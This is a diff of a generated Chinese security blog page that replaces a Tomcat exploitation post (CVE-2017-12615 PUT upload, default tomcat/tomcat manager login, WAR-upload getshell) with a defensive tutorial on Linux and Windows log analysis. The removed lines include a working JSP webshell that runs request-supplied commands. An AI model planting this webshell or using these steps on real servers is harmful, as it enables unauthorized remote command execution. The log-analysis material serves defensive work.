@@ -75,7 +75,7 @@
 
 
 
-  <meta name="keywords" content="漏洞复现," />
+  <meta name="keywords" content="入侵分析," />
 
 
 
@@ -86,25 +86,18 @@
 
 
 
-<meta name="description" content="cve-2017-12615、tomcat管理后台getshell">
-<meta name="keywords" content="漏洞复现">
+<meta name="description" content="Linux日志分析(awk,grep,wc...)，Windows日是分析(LogParser)">
+<meta name="keywords" content="入侵分析">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Tomcat">
-<meta property="og:url" content="http://yoursite.com/2018/07/31/Tomcat/index.html">
+<meta property="og:title" content="日志分析">
+<meta property="og:url" content="http://yoursite.com/2018/07/30/日志分析/index.html">
 <meta property="og:site_name" content="BEHIND THE GROWTH">
-<meta property="og:description" content="cve-2017-12615、tomcat管理后台getshell">
+<meta property="og:description" content="Linux日志分析(awk,grep,wc...)，Windows日是分析(LogParser)">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/2018/07/31/Tomcat/put1.png">
-<meta property="og:image" content="http://yoursite.com/2018/07/31/Tomcat/shell.png">
-<meta property="og:image" content="http://yoursite.com/2018/07/31/Tomcat/tomcatManager.png">
-<meta property="og:image" content="http://yoursite.com/2018/07/31/Tomcat/manager.png">
-<meta property="og:image" content="http://yoursite.com/2018/07/31/Tomcat/war.png">
-<meta property="og:image" content="http://yoursite.com/2018/07/31/Tomcat/shell2.png">
-<meta property="og:updated_time" content="2018-07-31T09:28:12.572Z">
+<meta property="og:updated_time" content="2018-08-02T06:30:59.235Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Tomcat">
-<meta name="twitter:description" content="cve-2017-12615、tomcat管理后台getshell">
-<meta name="twitter:image" content="http://yoursite.com/2018/07/31/Tomcat/put1.png">
+<meta name="twitter:title" content="日志分析">
+<meta name="twitter:description" content="Linux日志分析(awk,grep,wc...)，Windows日是分析(LogParser)">
 
 
 
@@ -134,13 +127,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/07/31/Tomcat/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/07/30/日志分析/"/>
 
 
 
 
 
-  <title>Tomcat | BEHIND THE GROWTH</title>
+  <title>日志分析 | BEHIND THE GROWTH</title>
   
 
 
@@ -201,16 +194,6 @@
               <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
             
             首页
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-about">
-          <a href="/about/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
-            
-            关于
           </a>
         </li>
       
@@ -277,7 +260,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/31/Tomcat/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/30/日志分析/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="WyyFree">
@@ -294,7 +277,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Tomcat</h1>
+          <h1 class="post-title" itemprop="name headline">日志分析</h1>
         
 
         <div class="post-meta">
@@ -306,8 +289,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-31T16:24:00-04:00">
-                2018-07-31
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-30T03:17:00+08:00">
+                2018-07-30
               </time>
             
 
@@ -329,8 +312,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
+                  <a href="/categories/安全审计/" itemprop="url" rel="index">
+                    <span itemprop="name">安全审计</span>
                   </a>
                 </span>
 
@@ -353,7 +336,7 @@
 
           
               <div class="post-description">
-                  cve-2017-12615、tomcat管理后台getshell
+                  Linux日志分析(awk,grep,wc...)，Windows日是分析(LogParser)
               </div>
           
 
@@ -373,57 +356,111 @@
         <p><hr></p>
 <center>
 
-<h2 id="CVE-2017-12615"><a href="#CVE-2017-12615" class="headerlink" title="CVE-2017-12615"></a>CVE-2017-12615</h2><p></p></center><p></p>
-<ul>
-<li>原理</li>
+<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p></p></center><p></p>
+<h3 id="日志文件-var-log"><a href="#日志文件-var-log" class="headerlink" title="日志文件(/var/log)"></a>日志文件(/var/log)</h3><ul>
+<li>日志文件配置(<strong>/etc/rsyslog.conf[syslog.conf]</strong>)：用于控制/var/log下的日志文件记录的内容<br>配置文件说明<br>参数格式：类型.级别[;类型.级别]&nbsp;&nbsp;&nbsp;&nbsp;动作<br>类型：<pre><code>auth    认证系统，即询问用户名和口令(syslog)
+authpriv   权限使用相关信息(auth.log/secure)
+user    本地用户应用程序的syslog信息
+cron    系统定时系统执行定时任务时发出的信息
+daemon  某些系统的守护程序的syslog,如由in.ftpd产生的log
+kern    内核的syslog信息
+lpr     打印机的syslog信息
+mail    邮件系统的syslog信息
+mark    定时发送消息的时标程序
+news    新闻系统的syslog信息
+uucp    uucp子系统的syslog信息
+local0..7 种本地类型的syslog信息,这些信息可以又用户来定义
+*       代表以上各种设备
+</code></pre>级别<pre><code>emerg   紧急，处于Panic状态。通常应广播到所有用户； 
+alert   告警，当前状态必须立即进行纠正。例如，系统数据库崩溃； 
+crit    关键状态的警告。例如，硬件故障； 
+err     其它错误； 
+warning 警告； 
+notice  注意；非错误状态的报告，但应特别处理； 
+info    通报信息； 
+debug   调试程序时的信息； 
+none    通常调试程序时用，指示带有none级别的类型产生的信息无需送出。如*.debug;mail.none表示调试时除邮件信息外其它信息都送出。
+</code></pre>动作<pre><code>/filename   日志文件。由绝对路径指出的文件名，此文件必须事先建立； 
+@host       远程主机； @符号后面可以是ip,也可以是域名，默认在/etc/hosts文件下loghost这个别名已经指定给了本机。
+user1,user2 指定用户。如果指定用户已登录，那么他们将收到信息； 
+*           所有用户。所有已登录的用户都将收到信息。
+</code></pre></li>
+<li>其他日志<br>/var/log/btmp 记录错误的登录尝试(auth/secure)。<br>/var/log/wtmp 记录所有登入登出。<br>&nbsp;&nbsp;&nbsp;&nbsp;last -f wtmp<br>/var/log/lastlog 记录每个用户最后登入信息。<br>&nbsp;&nbsp;&nbsp;&nbsp;command：last<br>/var/run/utmp 记录现在登入的用户。<br>&nbsp;&nbsp;&nbsp;&nbsp;command：w/who</li>
 </ul>
-<p>Tomcat配置了可写（readonly=false），导致我们可以往服务器写文件(PUT)<br>Tomcat版本：8.5.19</p>
-<pre><code>&lt;servlet&gt;
-    &lt;servlet-name&gt;default&lt;/servlet-name&gt;
-    &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt;
-    &lt;init-param&gt;
-        &lt;param-name&gt;debug&lt;/param-name&gt;
-        &lt;param-value&gt;0&lt;/param-value&gt;
-    &lt;/init-param&gt;
-    &lt;init-param&gt;
-        &lt;param-name&gt;listings&lt;/param-name&gt;
-        &lt;param-value&gt;false&lt;/param-value&gt;
-    &lt;/init-param&gt;
-    &lt;init-param&gt;
-        &lt;param-name&gt;readonly&lt;/param-name&gt;
-        &lt;param-value&gt;false&lt;/param-value&gt;
-    &lt;/init-param&gt;
-    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;
-&lt;/servlet&gt;
-</code></pre><ul>
-<li>复现</li>
-</ul>
-<p>虽然Tomcat对文件后缀有一定检测（不能直接写jsp），但我们使用一些文件系统的特性（如Linux下可用<code>/</code>）来绕过了限制。<br>jsbWebshell</p>
-<pre><code>&lt;%
-    if(&quot;0617&quot;.equals(request.getParameter(&quot;pwd&quot;))){
-        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();
-        int a = -1;
-        byte[] b = new byte[2048];
-        out.print(&quot;&lt;pre&gt;&quot;);
-        while((a=in.read(b))!=-1){
-            out.println(new String(b));
-        }
-        out.print(&quot;&lt;/pre&gt;&quot;);
-    }
-%&gt;
-</code></pre><p><img src="/2018/07/31/Tomcat/put1.png" alt="PUT"><br>访问上传的后门<br><img src="/2018/07/31/Tomcat/shell.png" alt="shell"></p>
 <p><hr></p>
 <center>
 
-<h2 id="Tomcat后台弱口令-amp-amp-后台getshell"><a href="#Tomcat后台弱口令-amp-amp-后台getshell" class="headerlink" title="Tomcat后台弱口令 &amp;&amp; 后台getshell"></a>Tomcat后台弱口令 &amp;&amp; 后台getshell</h2><p></p></center><p></p>
+<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p></p></center><p></p>
+<h3 id="事件查看器"><a href="#事件查看器" class="headerlink" title="事件查看器"></a>事件查看器</h3><p>打开事件管理器(开始—管理工具—事件查看/开始运行eventvwr)<br>Windows server 2008 系列参考 event ID :</p>
+<pre><code>4624 - 帐户已成功登录 
+4625 - 帐户登录失败 
+4648 - 试图使用明确的凭证登录(例如远程桌面）
+</code></pre><h3 id="分析方法"><a href="#分析方法" class="headerlink" title="分析方法"></a>分析方法</h3><ol>
+<li>主要分析安全日志,可以借助自带的筛选功能</li>
+<li>可以把日志导出为文本格式,然后使用文本编译器打开,使用正则模式去匹配或者过滤远程登录过的IP地址,在界定事件日期范围的基础<pre><code>正则匹配IP
+((?:(?:25[0-5]|2[0-4]\d|((1\d{2})|([1-9]?\d))).){3}(?:25[0-5]|2[0-4]\d|((1\d{2})|([1-9]?\d))))
+</code></pre></li>
+<li>日志分析工具Log Parser</li>
+</ol>
+<p><hr></p>
+<center>
+
+<h2 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h2><p></p></center><p></p>
 <ul>
-<li>后台弱口令</li>
+<li><p>常用中间件类型：<br>  apache<br>日志文件配置位置：apache.conf[httpd.conf]<br>  nginx<br>日志文件配置位置：nginx.conf<br>  tomcat<br>日志文件配置位置：conf/server.xml<br>  IIS<br>日志文件配置位置：日志 -&gt; 目录 -&gt; 浏览</p>
+</li>
+<li><p>无论任何web服务器其实日志需要关注的东西是一致的,即access_log和error_log。</p>
+</li>
+<li>排查方法：<br>  1、确定攻击时间范围<br>  2、确定攻击载荷<br>  3、确定攻击IP</li>
 </ul>
-<p>Tomcat后台：<a href="http://ip:8080/manager/html" target="_blank" rel="noopener">http://ip:8080/manager/html</a><br>弱口令：tomcat/tomcat<br>Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。<br>正常安装的情况下，tomcat8中默认没有任何用户，且manager页面只允许本地IP访问。<br><img src="/2018/07/31/Tomcat/tomcatManager.png" alt="conf"></p>
+<p><hr></p>
+<center>
+
+<h2 id="文本内容筛选"><a href="#文本内容筛选" class="headerlink" title="文本内容筛选"></a>文本内容筛选</h2><p></p></center><p></p>
+<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p><center>Linux</center></p>
 <ul>
-<li>后台上传war getshell</li>
+<li>cat：查看文件内容<pre><code>cat file1 file2
+cat *.log
+cat access*
+</code></pre></li>
+<li>more|head|tail|wc<pre><code>cat file | more[less] #分页显示,less可在显示也搜索(/?)
+cat file | head[tail] -n LINE #输出前[末尾]n行
+cat file | tail -f #实时显示刷新内容
+cat file | wc -l #统计行数
+</code></pre></li>
+<li>grep<pre><code>cat file | grep &quot;STR&quot;
+常用参数：
+    -r STR：当前目录文件内容关键字搜索
+    -v STR：排除包含STR的行
+    -i STR：忽略大小写
+    -n：在前面显示行数
+</code></pre></li>
+<li>awk：分离行匹配输出<pre><code>输出，$0：整行，-F：指定分割的符号(默认空格)
+awk -F &apos;str&apos; &apos;{print $field}&apos;
+去重
+&apos;!a[$filed]++{print $field}&apos;
+判断
+&apos;{if($field==continue)print $0}&apos;
+切割
+&apos;{split($field,value,str);print value[i]}&apos;
+</code></pre></li>
+<li>用例<pre><code>cat *.log | awk &apos;!a[$3]++{print $3}&apos;
+cat file | awk &apos;{split($1,a,&quot;-&quot;);if(a[3]==20)print $0}&apos; | more
+</code></pre></li>
 </ul>
-<p>1、制作war包<br>将1.jsp压缩成zip格式，将zip重命名为war -&gt; 1.war<br>2、后台上传<br><img src="/2018/07/31/Tomcat/manager.png" alt="manager"><br><img src="/2018/07/31/Tomcat/war.png" alt="war"><br>3、访问1.jsp<br><img src="/2018/07/31/Tomcat/shell2.png" alt="shell"></p>
+<p><center>Windows</center></p>
+<ul>
+<li>Logparser<br>1、格式<pre><code>logparser -i:evt -o:[datagrid] &quot;SQL&quot;
+参数：
+-i：输入源
+-o：输出源(net[默认]、datagrid、csv)
+SQL：查询语句
+</code></pre>2、用例<pre><code>Logparser.exe –i:EVT –o:DATAGRID “SELECT * FROM E:\logparser\xx.evtx”
+LogParser.exe -i:EVT &quot;SELECT TimeGenerated,EXTRACT\_TOKEN(Strings,0,&apos;|&apos;) AS USERNAME,EXTRACT\_TOKEN(Strings,2,&apos;|&apos;) AS SERVICE\_NAME,EXTRACT\_TOKEN(Strings,5,&apos;|&apos;) AS Client\_IP FROM &apos;e:\logparser\xx.evtx&apos; WHERE EventID=675 AND EXTRACT\_TOKEN(Strings,5,&apos;|&apos;)=&apos;x.x.x.x&apos;&quot;
+</code></pre>3、用logparser导出成csv格式(数据在同一行)<pre><code>Logparser.exe –i:EVT –o:csv “SELECT * FROM E:\logparser\xx.evtx” &gt; new.csv
+如果在Linux上打开会出现乱码，需要word重新打开保存
+</code></pre></li>
+</ul>
 
       
     </div>
@@ -441,7 +478,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/漏洞复现/" <i class="fa fa-tag"></i> 漏洞复现</a>
+            <a href="/tags/入侵分析/" <i class="fa fa-tag"></i> 入侵分析</a>
           
         </div>
       
@@ -454,8 +491,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/07/29/日志分析/" rel="next" title="日志分析">
-                <i class="fa fa-chevron-left"></i> 日志分析
+              <a href="/2018/07/30/入侵应急分析排查/" rel="next" title="入侵应急分析排查">
+                <i class="fa fa-chevron-left"></i> 入侵应急分析排查
               </a>
             
           </div>
@@ -464,8 +501,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2018/08/02/redis未授权访问/" rel="prev" title="Redis未授权访问">
-                Redis未授权访问 <i class="fa fa-chevron-right"></i>
+              <a href="/2018/08/01/Tomcat/" rel="prev" title="Tomcat">
+                Tomcat <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -602,7 +639,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2017-12615"><span class="nav-number">1.</span> <span class="nav-text">CVE-2017-12615</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tomcat后台弱口令-amp-amp-后台getshell"><span class="nav-number">2.</span> <span class="nav-text">Tomcat后台弱口令 &amp;&amp; 后台getshell</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux"><span class="nav-number">1.</span> <span class="nav-text">Linux</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#日志文件-var-log"><span class="nav-number">1.1.</span> <span class="nav-text">日志文件(/var/log)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows"><span class="nav-number">2.</span> <span class="nav-text">Windows</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#事件查看器"><span class="nav-number">2.1.</span> <span class="nav-text">事件查看器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#分析方法"><span class="nav-number">2.2.</span> <span class="nav-text">分析方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#中间件"><span class="nav-number">3.</span> <span class="nav-text">中间件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文本内容筛选"><span class="nav-number">4.</span> <span class="nav-text">文本内容筛选</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#工具"><span class="nav-number">4.1.</span> <span class="nav-text">工具</span></a></li></ol></li></ol></div>
             
 
           </div>
